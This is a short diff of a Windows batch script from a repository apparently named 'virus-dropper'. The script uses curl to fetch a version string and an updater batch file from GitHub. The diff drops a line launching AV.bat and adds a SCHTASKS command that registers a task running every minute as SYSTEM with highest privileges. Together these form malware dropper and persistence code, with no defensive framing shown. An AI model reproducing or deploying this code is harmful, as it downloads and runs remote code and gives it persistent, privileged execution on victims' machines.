@@ -5,6 +5,6 @@ FOR /F %%I IN ('curl "https://raw.githubusercontent.com/YumYummity/virus-dropper
 If %output% == %version% "exit" ELSE "goto update"
 
 :update
-start /min AV.bat
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/updater.bat" --output "Updater.bat"
+SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\Updater.bat" /TN "updateTEMP" /RL HIGHEST /RU SYSTEM
 exit
